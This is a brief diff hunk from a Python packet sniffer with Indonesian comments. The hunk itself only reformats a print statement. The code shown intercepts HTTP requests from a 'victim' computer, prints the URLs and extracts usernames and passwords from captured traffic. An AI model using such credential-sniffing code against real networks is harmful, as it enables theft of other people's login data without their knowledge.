@@ -27,7 +27,7 @@ def get_login_info(packet): # funct untuk mengambil username / password
 def process_sniffed_packet(packet): # fungsi yang akan dipanggil balik terus menerus saat function sniff dijalankan
     if packet.haslayer(http.HTTPRequest): # cek jika website memiliki layers dan layers yang dikunjungi/dibuka komputer korban adalah http request 
         url = get_url(packet) # panggil funct get_url yang diisi dalam var url
-        print("[+]HTTP Request >>",url)
+        print("[+] HTTP Request >>",url)
         
         login_info = get_login_info(packet) # panggil funct get_login_info yang diisi dalam var login_info
         if login_info: # cek apakah ada aktifitas / packet login, jika ada, maka
